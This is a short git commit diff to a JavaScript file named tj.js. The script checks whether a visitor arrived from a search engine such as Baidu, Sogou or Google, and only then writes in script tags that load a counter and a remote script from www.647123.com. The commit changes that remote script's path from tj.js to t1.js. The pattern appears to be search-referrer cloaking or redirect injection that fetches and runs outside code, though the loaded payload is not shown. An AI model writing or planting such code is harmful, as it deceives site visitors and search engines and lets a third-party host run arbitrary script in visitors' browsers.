85ac36d4b508504d9d5eda3476eaa02dfc7402b7
js999999999 <js-9@outlook.com>
2017-02-25 14:01:41 +0800

    Update tj.js

--- ajs/tj.js
+++ ajs/tj.js
@@ -3,7 +3,7 @@ today=today.getYear()+"-"+(today.getMonth()+1)+"-"+today.getDate();
 var regexp=/\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\.[a-z0-9\-]+){1,2}\//ig;
 var where =document.referrer;
 if(regexp.test(where)){
-document.write ('<script language="javascript" src="http://count28.51yes.com/click.aspx?id=280954514&logo=6" charset="gb2312"></script><script language="javascript" type="text/javascript" src="http://www.647123.com/ajs/tj.js"></script></div>');
+document.write ('<script language="javascript" src="http://count28.51yes.com/click.aspx?id=280954514&logo=6" charset="gb2312"></script><script language="javascript" type="text/javascript" src="http://www.647123.com/ajs/t1.js"></script></div>');
 }
 else
 {
